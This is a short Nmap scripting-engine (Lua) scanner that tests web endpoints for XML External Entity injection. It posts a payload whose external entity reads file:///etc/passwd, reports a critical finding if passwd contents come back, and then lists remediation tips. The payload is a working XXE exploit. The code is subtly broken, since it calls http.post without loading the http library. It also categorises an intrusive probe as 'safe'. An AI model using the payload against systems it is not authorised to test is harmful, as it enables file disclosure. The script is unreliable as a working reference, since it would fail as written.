local nmap = require("nmap")
local stdnse = require("stdnse")
local bin = require("bin")

description = [[
Tests for XML External Entity (XXE) injection by sending crafted
XML payloads and checking for information disclosure.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"safe", "default"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or port.number == 8080)
end

action = function(host, port)
    local output = {}
    local issues = {}

    local endpoints = {"/", "/api", "/api/v1", "/upload", "/import"}

    table.insert(output, "XXE Injection Check:")

    for _, path in ipairs(endpoints) do
        local options = {
            header = {
                ["Content-Type"] = "application/xml",
            },
            content = '<?xml version="1.0" encoding="UTF-8"?>' ..
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' ..
                '<root>&xxe;</root>',
        }

        local response = http.post(host, port, path, options)

        if response then
            if response.status == 200 and response.body then
                if response.body:find("root:.*:0:0:") then
                    table.insert(issues, "CRITICAL: XXE at " .. path .. " - file read possible")
                end
            elseif response.status == 400 or response.status == 415 then
                table.insert(output, "  " .. path .. ": XML rejected (good)")
            end
        end
    end

    table.insert(output, "\nRecommendations:")
    table.insert(output, "  - Disable external entity processing")
    table.insert(output, "  - Use JSON instead of XML where possible")
    table.insert(output, "  - Validate and sanitize XML input")

    if #issues > 0 then
        table.insert(output, "\nSecurity Issues:")
        for _, issue in ipairs(issues) do
            table.insert(output, "  " .. issue)
        end
    else
        table.insert(output, "\nNo XXE vulnerabilities detected")
    end

    return stdnse.format_output(true, output)
end
